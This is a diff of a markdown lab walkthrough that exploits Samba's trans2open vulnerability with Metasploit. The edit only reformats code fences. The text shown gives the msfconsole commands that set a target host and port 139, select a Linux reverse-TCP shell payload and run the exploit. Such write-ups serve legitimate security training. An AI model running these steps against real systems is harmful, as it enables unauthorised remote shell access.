@@ -21,7 +21,8 @@ searchsploit samba
 ```
 # 3. Exploitation:
 The following commands can be used to launch Metasploit.
-execute ```bash 
+execute 
+```bash 
 sudo msfconsole
 ```
 ## Then we search the vulnerability and configure options for exploitation.
@@ -38,16 +39,20 @@ Options
 ```   We can use options command to see the options.
 
 Use:-
-msf exploit(linux/samba/trans2open) > ```bash
+msf exploit(linux/samba/trans2open) >
+ ```bash
 set RHOST <target Ip(10.0.2.5)>
 ```
-msf exploit(linux/samba/trans2open) > ```bash 
+msf exploit(linux/samba/trans2open) > 
+```bash 
 set RPORT 139
 ```
-msf exploit(linux/samba/trans2open) > ```bash
+msf exploit(linux/samba/trans2open) > 
+```bash
 set payload linux/x86/shell_reverse_tcp
 ```
-msf exploit(linux/samba/trans2open) > ```bash 
+msf exploit(linux/samba/trans2open) > 
+```bash 
 exploit
 ```
 
